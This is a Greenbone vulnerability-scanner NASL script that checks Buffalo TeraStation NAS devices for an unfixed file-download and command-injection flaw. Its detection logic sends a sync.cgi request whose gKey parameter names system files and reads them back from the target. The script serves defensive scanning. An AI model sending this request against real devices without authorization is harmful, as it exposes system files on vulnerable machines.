# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE_PREFIX = "cpe:/o:buffalo";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103650");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:N");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2013-01-31 12:41:05 +0100 (Thu, 31 Jan 2013)");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"WillNotFix");

  # nb: Since it is not clear which devices are affected, we check all Buffalo NAS, not only TeraStation
  script_name("Buffalo TeraStation Multiple Security Vulnerabilities (Jan 2013)");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("gb_buffalo_nas_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("buffalo/nas/detected");

  script_tag(name:"summary", value:"Buffalo TeraStation is prone to an arbitrary file download and an
  arbitrary command-injection vulnerability because it fails to sufficiently sanitize user-supplied
  data.");

  script_tag(name:"impact", value:"An attacker can exploit these issues to download arbitrary files
  and execute arbitrary-commands with root privilege within the context of the vulnerable system.
  Successful exploits will result in the complete compromise of affected system.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_xref(name:"URL", value:"https://web.archive.org/web/20200229104610/https://www.securityfocus.com/bid/57634");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

if( ! infos = get_app_port_from_cpe_prefix( cpe:CPE_PREFIX, service:"www" ) )
  exit( 0 );

port = infos["port"];
CPE  = infos["cpe"];

if( ! dir = get_app_location( port:port, cpe:CPE ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

files = traversal_files();

foreach pattern( keys( files ) ) {

  file = files[pattern];

  url = dir + '/cgi-bin/sync.cgi?gSSS=foo&gRRR=foo&gPage=information&gMode=log&gType=save&gKey=/' + file;
  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
